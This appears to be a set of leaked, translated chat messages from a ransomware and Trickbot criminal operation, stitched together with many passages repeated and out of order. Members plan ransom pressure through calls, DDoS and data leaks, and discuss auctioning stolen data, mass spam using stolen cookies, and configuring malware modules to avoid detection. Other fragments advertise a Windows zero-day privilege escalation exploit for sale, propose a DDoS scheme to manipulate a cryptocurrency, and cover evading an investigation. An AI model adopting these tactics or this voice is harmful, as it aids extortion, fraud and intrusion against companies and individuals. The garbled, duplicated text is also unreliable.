And now we have a hitch there and we will rewrite it &quot;It&#39;s a long time. So in order to keep my work alive, I&#39;m looking for a new locker partner. I have several teams of pentesters, several independent pentesters and my own targets, all kinds. I only need a locker, but in fact 30% will not suit me. Because big teams worked for me for a smaller percentage, and I still have to earn something on administration.Your locker fell into my hands from intermediaries and I tested it, it&#39;s not bad, so I wrote.If you have a more interesting suggestion for%, then I&#39;m ready to consider it. &quot;We brought the pentesters to Khorsa there, found a few more coders this week, the recruitment is slowly moving forward.

If it is possible to authorize, we send a test letter (p. 4) to a test mailbox (p. 3). We enter this verified email along with the current time into the pending list (those for which the result is expected). These checks are performed in several threads, the checked list is divided accordingly. 11. A separate thread checks test mailboxes (item 3) using the IMAP/POP3 protocol. From: all incoming emails are compared to the email in the pending list. If it matches, then sending through this account is working. Such an email is entered in the output list of suitable ones. If during the timeout (point 5) there was no incoming from this mail, such an email is entered into the &quot;timeout&quot; list. In all other cases, the email is marked as invalid. REQUIREMENTS 12. Work under OS Linux. 13. Implementation language - preferably Python, other options are discussed. 14. The overall goal of the checker should be to reduce scan time. As many checks as possible per unit of time - taking into account multithreading or whatever. &quot;The C Programming Language&quot; by Kernighan Ritchie\n",

      "1. Yahoo/AOL === gmail got kicked out, or what? this is the most interesting material, based on it, all development is underway 2. Mail names are generated based on macros === I have done much cooler 3. captcha is not taken into account yet, we will take into account 4. proxy is a weak option, there will be nordvpn or amazon lambdas (as in cart) in the docker 5. SMTP will be taken into account 6. profile creation will be taken into account 7. Mail distribution goes through GET requests for fast distribution of large volumes of letters 100.000 thousand, 200.000 thousand. === This is a children&#39;s option - any mail server will immediately shut down such activity. Here in this article https://ericdraken.com/headless-chrome-vpn-docker/ a working option is described - you will need to create thousands of such docker containers and send only 10 letters from each mail account sent by an emulator with AI that simulates mouse movements , similar to human. Each mailer now has AI, it recognizes all movements in the browser and over the get-requests for sending hundreds of thousands of letters, their AI will simply laugh out loud. 8. the moment with authorization by cookies without a password is correct, I noticed this a long time ago when working with stealers, load cookies and just log in to your account repetitions, if the proxy is more, then 1 acc 1 proxy. === If you change the ip in aka, problems with logging in will immediately begin, it is better to refuse this option, the ideal option is docker with vpn. 10. Generating PDF files with macros + using wkhtmltopdf === this is not required, pappetir knows how to do it from birth, the rest, it seems, everything is normal TK - practically new, a lot of additions, accepted for execution\n",

      "With Khors, we are also procrastinating on the topic of ransoms, as I understand it, everyone is very reluctant to pay, you need to push harder .. Limiting the time frame xs of course how, 2 weeks is quite acceptable, as many take loans, etc. .. I think that we need to analyze and nightmare more deeply by merging something that is dear to them, and not everything in a row, plus we need to push harder, annoy with calls, ddos partners, cover it in the media .. I propose to organize the work in such a way that by the time of the lock we have a complete analysis report: top management, contacts, their personal data, what we will find, partners, their contacts, and most importantly, a strategy is calculated on how to press, what is acceptable for what targets. We wrinkle boobs, bargain like schoolchildren, gangsters donât behave like that, all these concessions are useless, I didnât expect this from you even somehow :-D We just need to set ransoms more realistically from the beginning and stand firm. And we start with a lyama and agree to 100k. Taking into account the fact that the FBI is sitting there monitoring all these negotiations, I think they are mocking us. Itâs not just that they drag out all these negotiations, they study us, wallets, etc. Maybe a big leak is some kind of loud or something else that will attract attention, it can even make locks and drains without ransoms at all - an exemplary flogging supposedly) Throw 30 50 100 companies there - throw out all the data we can get .. maybe not even large ones, but so that it was heard, so that everyone else would tense up and think less .. And change the color of the admin panel, we are a locker, not tiffany :-D\n",

I paid for these servers and they were turned on after 10 minutes, everything is ok. it seems like the defender wrote to me the next day that frank complained about me and in general these servers are important. I explained the situation to him too, the defender himself told me about their importance for the first time, agreed that I would extend and ask customers about the extension when ordering, there were no showdowns, there was no more dialogue with Frank except for the extension, only he, apparently, also wrote to Francis who sent me to you. Before that, there were situations too, but I took measures, I did an inventory for a month, demolished the system, updated all the lists, there are no problems. Frank&#39;s servers are my responsibility, I had to contact him myself, but I did not think that they were needed at all\n",

Our old case was resumed, the investigator said why it was resumed, the Americans officially requested information about Russian hackers, not only about us, but in general who was caught in the country. Actually, they are interested in the trickbot, and some other viruses. On the following Tuesday, the investigator called us for a conversation, but for the time being, like as witnesses. But for now we will be at 51. Even as the investigator said, the case was extended until the end of October in order to have a conversation with us. Since if the case is suspended, they cannot interrogate us in any way, and, as a matter of fact, because of this, they resumed it. We have already contacted our lawyers. Question: Would it be possible to get a salary? What would I do to extend my lawyer right now and go on vacation until the end of October? To destroy all this bullshit. The only thing I will go to issuing routers every day. I give them to thunder and defu.\n",

Ed@ took advantage of this. He sat in my ear, why do those ehors come to us, everything is super with us! Conditions will only get better!). Since November, we have received decent netting norms, more than 10. He gave us access to the chat only in December. He said they say as someone will immediately go ladies. And of course there were no chats. And as practice has shown, with the last grid with which he did not pay extra. He generally communicated by mail. Therefore, there is reason to doubt the rest. But I wonât even get the lock id, he banned me and my entire team in his chat. The moral is that he introduced us and put himself on a par with you. That this is his child and so on. And when we met, I also told you the story of how a pirate threw us, and you told me that working with you this would never happen again.\n",

      "âDuring normal operation, the alternate desktop is created and fully controlled by the module, copying the icons from the desktop, creating a custom taskbar for managing its processes and creating a custom right-click menu, containing custom functionality,â Bitdefender researchers write in their report.\n",

      "âDuring normal operation, the alternate desktop is created and fully controlled by the module, copying the icons from the desktop, creating a custom taskbar for managing its processes and creating a custom right-click menu, containing custom functionality,â Bitdefender researchers write in their report.\n",

For my part, I do not agree with the idea that I should be in touch 24 hours, I sold 8 hours of my time, and sometimes I stay late at work at will, but this is my free will, if I donât want to, I wonât. I agree with you that I need to adjust my time, I&#39;m doing this, I&#39;ll try to solve it and be in touch during working hours, I generally have difficulty sleeping.

I think it&#39;s my responsibility to figure it out and solve problems, and I, by virtue of my abilities and speed, believe that I can cope with this. Your task and other interested parties is to give me access, code, servers and everything I need to work effectively, I donât think that everything is perfect with this, so the responsibility here is yours. I believe that the situation when I cannot quickly resolve the issue is normal, given the conditions in which I find myself.

I proposed the following scheme to Buza: We have a separate rocket for reconnaissance. there is a group on requests - there hackers are asked to put pressure on or prepare this or that company. we pass it on to analysts, they make a dossier report. if blackmail\\calls is required - we transfer this task to the callers. In order for callers to work efficiently and not call into the air, as it is happening right now - they are in touch with analysts, they can ask them for any additional data, for example, part of the date listing, or some kind of information about computers / passwords. If the company does not make contact, its data is transmitted further, for publication on the site. (for this you need to bring either a reshaev or some of his support into this chat) the essence of the problem with calls is such that most often when calling, the caller ends up at the reception where some kind of tpshka does not know the situation at all. and in fact, we just came out of nowhere with such a call, we need some kind of proof to get a result, and not just to hang up or send calls .. In principle, everything is already working, you just need to tune it up and so that hackers start using it. I pulled a gang of dereke, horse, and even pull up the reverse ..\n",

      "1. Salamander wrote everything off, I&#39;m waiting for reports from him. 2. Signed off with Veron - he has troubles with the dock so far. I promised to help him over the holidays, either weâll make a dock for him, or the second option is a container. I gave him a presentation, described everything how it works and what he can do, Iâm waiting to see how. At the start, he will say during the holidays - he is waiting for the issue with the dock / delivery of the payload to be resolved. 3. You still haven&#39;t answered what config is needed for installs. Let me remind you that we decided to give the version of Trick2 for it (which was originally planned for Target) for Veron - which modules should be in the troy config, and which ones can be removed so as not to fire extra modules and reduce the weight / detections of exe. If I understand the software device correctly, I need an injector, pvgrab, importdll. What other modules are vital in the config? 4. Contacted Khors about admins - he clarified the task, He says we need pentesters rather than admins. And at 6 in the morning, a great idea came to my beautiful and drunk head where to get them :) Do you remember the revils were promoted for damage - they threw lam bucks in cue balls on a deposit and then they started to break the topic - they wrote there that they were inviting teams of hackers / pentesters to work with them. They wrote 5 pages of the topic with suggestions! They write something like that. &quot;Team 3 people experience, etc&quot; and there are a lot of them 5 or more even pages! That&#39;s where we&#39;ll take them! I will spam personals with a job offer for them all + many people left contacts there themselves (although everyone has toxins). By the 10th it will be done. The only question is how to pay them. How much do we pay? 2k - how is everyone? And the salary for me if possible)) bc1qclzlkq8j3ckmulye0k5xpzfymsxxha735mlauf\n",
      "And here&#39;s another. I suggest for Verona to always prepare 2 files at once for 2 groups. So that in case the file gets tired quickly (and this is not uncommon for us + its volumes) - we always had a ready-made encrypted second file in order to avoid downtime and waiting for cryptors. I think it will be a good move, I just remember the times when I myself lil - our main problem was to get the file by 10 am (and he is an early bird and does not tolerate delay) and the second moment is the replacement of crypts - before it could last for 2 hours. And with such a maneuver, we are well reinsured.\n",

Our company had paid access at the old rates until 02/01/21. After long negotiations with Hh, we managed to agree on preferential terms before the summer, but the price of access has increased and a viewing limit has been set per month. It is important to understand that now there is a new stage in working with resumes, ALL job sites have introduced billing based on the number of open contacts. And Hh introduced a lot of restrictions: viewing limits, restrictions on creating new cabinets, enhanced control of the Security Council, etc. Plus, 90% of providers are blocked or have stopped transferring their accounts to 3rd parties.

      "As you know, Hh introduced new rules on August 1, the cost of one resume on the site now costs 60 rubles, excluding the purchase of the access itself! Our company had paid access at the old rates until 02/01/21. After long negotiations with Hh, we managed to agree on preferential terms before the summer, but the price of access has increased and a viewing limit has been set per month. It is important to understand that now there is a new stage in working with resumes, ALL job sites have introduced billing based on the number of open contacts. And Hh introduced a lot of restrictions: viewing limits, restrictions on creating new cabinets, enhanced control of the Security Council, etc. Plus, 90% of providers are blocked or have stopped transferring their accounts to 3rd parties. Also since February, many companies have switched to new rules of work. For all these reasons, cabinets on hh have become scarce.

And you can delete the data of a particular company only by paying for them. The cost is determined by the number of remaining files * let&#39;s say 3 bucks per file. And then through the auction system. Let&#39;s say there is a fuss about some company - we sell to the one who makes the highest bid in the last 24-48 hours. I think so that they did not pay ok.

We find a place where crypto holders communicate (discord, etc.). Find out the IP of the node. Most likely it will be IPv6. We start ddosing. We fly into the chat that we found earlier and write that there are problems, the crypt is not displayed, operations are not carried out. (because the crypto depends on mining, there will really be problems). Holders start to get nervous and bring out the main balance. Crypto falls in price. We buy at a low price. We release ddos. Crypto is growing again. We are on the plus side. Or a variant of a letter to the creators about the possibility of a ransom if they want the ddos to end.

Developers (we), in principle, can act as witnesses. At the first stage without sharding, I think we will do it. Let it be for now.\n",

Should launch next week. Tom also seems to be starting from PND, we provided him with everything he needed.

And now we have a hitch there and we will rewrite it &quot;It&#39;s a long time. So in order to keep my work alive, I&#39;m looking for a new locker partner. I have several teams of pentesters, several independent pentesters and my own targets, all kinds. I only need a locker, but in fact 30% will not suit me. Because big teams worked for me for a smaller percentage, and I still have to earn something on administration.Your locker fell into my hands from intermediaries and I tested it, it&#39;s not bad, so I wrote.If you have a more interesting suggestion for%, then I&#39;m ready to consider it. &quot;We brought the pentesters to Khorsa there, found a few more coders this week, the recruitment is slowly moving forward.

Now I am finishing a full report on the mechanism of operation of the Intel ME controller and the AMT technology based on it. Restored a bunch of undocumented commands with the help of reverse, interaction interface dump and fuzzing. Unfortunately, the starting theory based on the presentation of the Embedi/PositiveTechnologies researchers was not confirmed in the form in which they presented it, but there is another legal mechanism to activate AMT, but so far it has not reached a working POK, at the moment I am making a buffer sniffer that provides the HECI interface, because this is all configured in UEFI, then the sniffer took a little longer, after I completely restore the command set, the POK will be prepared. There are ideas, if we talk about ufi, then this is not just a load dropper, but also possibly some kind of daemon of the SMM level of handlers, plus. Now I have closely studied the ME controller, then there are ideas to test such functionality as rewriting an SPI flash drive through it.

      "Hey bro!\n",
      "Good afternoon. There is a 0-day privilege escalation exploit for a Use-after-Free vulnerability in the WIDFRD.sys driver. The exploit was implemented for Windows 10 x64 1607, 1703, 1709, 1803, 1809, 1903, 1909. The vulnerability exists in 2004 and later, but the corresponding code in the driver was rewritten, and the OS crashes into a BSOD before the target null pointer dereference vulnerability is triggered . There are some nuances in operation: not all systems may be vulnerable, as there is a dependence on the hardware configuration. Operation occurs by disabling SMEP (modification CR4), modifying PTE/PML4 if necessary, and executing the code that replaces the token for the target process with the system one. I am publishing an ad here, because my regular customers do not need / did not fit, and in a personal message from those who expressed a desire to buy on the forum, no one answers. Price - 60k, negotiable. For those who wish, I can write and issue a utility that, when launched on the system of interest, will tell whether the OS is vulnerable or not. The first contact in the LAN, then in the jabber. I will add: The exploit is sold in one hand. Video of work: https://filetransfer.io/data-package/ctyCDTW6#link Password bvdiviy2861rVJVl What happens in the video: 1. The wud.exe process is launched, exploiting the vulnerability. 2. wud.exe spawns a cmd.exe process and pauses for 5 seconds to check privileges. 3. I launch notepad.exe from the created console (instance 1). 4. After some time, I check the privileges and run notepad.exe (instance 2). 5. In Process Explorer I check the cmd.exe level and alternately 2 instances of notepad.exe. It can be seen that instance 1 is launched with medium IL, the second (when the rights of cmd.exe have already been elevated) with SYSTEM.\n",

Weldon conjures over the antique, removes hanks and errors, immediately checking whether the project will be assembled. By injection under VNC: The problem of not loading some sites, or loading in the wrong form, associated with inserting our code into html. As a result of the work, a lot of ssl certificates and a cache are created, while some of them are updated, and some are not. At the same time, the criteria for such behavior are unknown, which leads to difficulties in recreating the problem situation on the test machine. As a result, if Chrome has not updated the cache, our certificate does not suit it, some of the pieces are taken normally, some are not, a conflict occurs, resulting in a page break. This needs to be checked with the config encoder. Even today, Jaime has assembled an assembly to combat the privacy error, Robin will throw off the addresses that need to be checked. Otherwise, no big changes so far. Well, there were also problems with detections on triples, but this was overcome at the moment, today the triple is without them.\n",

Whatever we dream about, in this system, well-known layers are clearly distinguished: - a P2P network that connects nodes; - a distributed database (DAG or blockchain), which stores certain blocks and ensures customer confidence in what it stores; - what is the payload in blocks - transactions or anything, even pictures, or DeFi. And these layers are independent, they provide interfaces to each other and everything (like a network stack, for example). 3. Nodes our clients will run on anonymously rented servers.

I promised to help him over the holidays, either weâll make a dock for him, or the second option is a container. I gave him a presentation, described everything how it works and what he can do, Iâm waiting to see how. At the start, he will say during the holidays - he is waiting for the issue with the dock / delivery of the payload to be resolved. 3. You still haven&#39;t answered what config is needed for installs. Let me remind you that we decided to give the version of Trick2 for it (which was originally planned for Target) for Veron - which modules should be in the troy config, and which ones can be removed so as not to fire extra modules and reduce the weight / detections of exe. If I understand the software device correctly, I need an injector, pvgrab, importdll. What other modules are vital in the config? 4. Contacted Hors about admins - he clarified the task, He says we need pentesters rather than admins. And at 6 in the morning, a great idea came to my beautiful and drunk head where to get them :) Do you remember the revils were promoted for damage - they threw lam bucks in cue balls on a deposit and then they started to break the topic - they wrote there that they were inviting teams of hackers / pentesters to work with them. They wrote 5 pages of the topic with suggestions! They write something like that. &quot;Team 3 people experience, etc&quot; and there are a lot of them 5 or more even pages! That&#39;s where we&#39;ll take them! I will spam personals with a job offer for them all + many people left contacts there themselves (although everyone has toxins). By the 10th it will be done. The only question is how to pay them. How much do we pay? 2k - how is everyone? And the salary for me if possible)) bc1qclzlkq8j3ckmulye0k5xpzfymsxxha735mlauf\n",

I think it will be a good move, I just remember the times when I myself lil - our main problem was to get the file by 10 am (and he is an early bird and does not tolerate delay) and the second moment is the replacement of crypts - before it could last for 2 hours.

      "Hello, things are not bad, now the main problems are the work of injection under VNC and Antique. Weldon conjures over the antique, removes hanks and errors, immediately checking whether the project will be assembled. By injection under VNC: The problem of not loading some sites, or loading in the wrong form, associated with inserting our code into html. As a result of the work, a lot of ssl certificates and a cache are created, while some of them are updated, and some are not. At the same time, the criteria for such behavior are unknown, which leads to difficulties in recreating the problem situation on the test machine. As a result, if Chrome has not updated the cache, our certificate does not suit it, some of the pieces are taken normally, some are not, a conflict occurs, resulting in a page break. This needs to be checked with the config encoder. Even today, Jaime has assembled an assembly to combat the privacy error, Robin will throw off the addresses that need to be checked. Otherwise, no big changes so far. Well, there were also problems with detections on triples, but this was overcome at the moment, today the triple is without them.\n",

Written in C++, works only under linux, of course. 2. There is also Exonum. It is an open source framework for building blockchain applications. It is focused on working with closed blockchains. The Exonum framework was created specifically for the development of private blockchains. This is a system in which only a predefined group of nodes (those same validators) can create new blocks in the blockchain. This one is written in Rust. I looked at their Github. It can be seen that they are accompanying, a month ago there were some changes. Not abandoned. We must already do something. I see myself as a bum. Reading, reading... In general, I&#39;m trying to make a p2p network in Rust. I understand and have already started writing code. But you need to take a closer look at Exonum.\n",

Mail names are generated based on macros === I have done much cooler 3. captcha is not taken into account yet, we will take into account 4. proxy is a weak option, there will be nordvpn or amazon lambdas (as in cart) in the docker 5. SMTP will be taken into account 6. profile creation will be taken into account 7. Mail distribution goes through GET requests for fast distribution of large volumes of letters 100.000 thousand, 200.000 thousand. === This is a children&#39;s option - any mail server will immediately shut down such activity. Here in this article https://ericdraken.com/headless-chrome-vpn-docker/ a working option is described - you will need to create thousands of such docker containers and send only 10 letters from each mail account sent by an emulator with AI that simulates mouse movements , similar to human. Each mailer now has AI, it recognizes all movements in the browser and over the get-requests for sending hundreds of thousands of letters, their AI will simply laugh out loud. 8. the moment with authorization by cookies without a password is correct, I noticed this a long time ago when working with stealers, load cookies and just log in to your account repetitions, if the proxy is more, then 1 acc 1 proxy. === If you change the ip in aka, problems with logging in will immediately begin, it is better to refuse this option, the ideal option is docker with vpn. 10. Generating PDF files with macros + using wkhtmltopdf === this is not required, pappetir knows how to do it from birth, the rest, it seems, everything is normal TK - practically new, a lot of additions, accepted for execution\n",

      "With Khors, we are also procrastinating on the topic of ransoms, as I understand it, everyone is very reluctant to pay, you need to push harder .. Limiting the time frame xs of course how, 2 weeks is quite acceptable, as many take loans, etc. .. I think that we need to analyze and nightmare more deeply by merging something that is dear to them, and not everything in a row, plus we need to push harder, annoy with calls, ddos partners, cover it in the media .. I propose to organize the work in such a way that by the time of the lock we have a complete analysis report: top management, contacts, their personal data, what we will find, partners, their contacts, and most importantly, a strategy is calculated on how to press, what is acceptable for what targets. We wrinkle boobs, bargain like schoolchildren, gangsters donât behave like that, all these concessions are useless, I didnât expect this from you even somehow :-D We just need to set ransoms more realistically from the very beginning and stand our ground. And we start with a lyama and agree to 100k. Taking into account the fact that the FBI sits everywhere monitoring all these negotiations, I think they are mocking us. Itâs not just that they drag out all these negotiations, they study us, wallets, etc. Maybe a big leak is some kind of loud or something else that will attract attention, it can even make locks and drains without ransoms at all - an exemplary flogging supposedly) Throw 30 50 100 companies there - throw out all the data we can get .. maybe not even large ones, but so that it was heard, so that everyone else would tense up and think less ..

I paid for these servers and after 10 minutes they turned on everything ok. it seems like the defender wrote to me the next day that frank complained about me and in general these servers are important. I explained the situation to him too, the defender himself told me about their importance for the first time, agreed that I would renew and ask customers about an extension when ordering, there were no showdowns, there was no more dialogue with Frank except for the extension, only he, apparently, also wrote to Francis who sent me to you. Before that, there were situations too, but I took measures, I did an inventory for a month, demolished the system, updated all the lists, there are no problems. Frank&#39;s servers are my responsibility, I had to contact him myself, but I did not think that they were needed at all\n",

Our old case was resumed, the investigator said why it was resumed, the Americans officially requested information about Russian hackers, not only about us, but in general who was caught in the country. Actually, they are interested in the trickbot, and some other viruses. On the following Tuesday, the investigator called us for a conversation, but for the time being, like as witnesses. But for now we will be at 51. Even as the investigator said, the case was extended until the end of October in order to have a conversation with us. Since if the case is suspended, they cannot interrogate us in any way, and, as a matter of fact, because of this, they resumed it. We have already contacted our lawyers.

As the stern will be, I will write to him that you threw off the salary, but how would you be against it. We communicate well with him. No matter how we work for the first day. Chef, well, you breed this garbage yourself, you feel sorry for everyone, but they get used to it and sit on their necks. It is necessary that you be online more often and in some situations, FOR EDUCATIONAL PURPOSES, be harder. And it turns out that we are playing bad / good cop here, Iâm fussing around here, fucking their brains so that everyone works, I swear when I see that there is no result, and then you come and feel sorry for all of them, warm, although there is no result from them . Everyone will get used to the fact that you can cry to Stern and he will forgive, give money. I will not teach you, you yourself know everything, just reminded once again.\n",

Written in C++, works only under linux, of course. 2. There is also Exonum. It is an open source framework for building blockchain applications. It is focused on working with closed blockchains. The Exonum framework was created specifically for the development of private blockchains. This is a system in which only a predefined group of nodes (those same validators) can create new blocks in the blockchain. This one is written in Rust. I looked at their Github. It can be seen that they are accompanying, a month ago there were some changes. Not abandoned. We must already do something. I see myself as a bum. Reading, reading...

I will upload by tax, and fix the log post, finish the cookies with Nicholas and transfer the system to support, I donât know for sure yet, but we are discussing it. I will return from vacation and we will calmly develop the system further. Now I see that bugs are prioritized in order to work quietly 3 tasks (1 from you and 2 from robin).
